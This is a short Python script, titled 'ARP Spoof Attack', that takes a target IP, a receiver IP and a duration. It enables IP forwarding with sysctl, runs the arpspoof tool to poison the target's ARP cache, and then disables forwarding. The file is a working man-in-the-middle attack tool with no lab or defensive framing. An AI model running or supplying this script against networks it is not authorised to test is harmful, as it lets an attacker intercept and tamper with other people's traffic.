import argparse
import subprocess

def parse_args():
    p = argparse.ArgumentParser(description="ARP Spoof Attack")

    p.add_argument("--target-ip", required=True)
    p.add_argument("--receiver-ip", required=True)
    p.add_argument("--duration", type=int, required=True)
    
    return p.parse_args()

def arp_spoof(target_ip, receiver_ip, duration):
    # enable IP forwarding on attacker's machine to allow traffic to be forwarded to the attacker
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"])

    subprocess.run([
        "arpspoof",
        "-t", target_ip,
        receiver_ip
    ], timeout=duration)

    # disable IP forwarding after attack is done
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"])


if __name__ == "__main__":
    args = parse_args()
    arp_spoof(args.target_ip, args.receiver_ip, args.duration)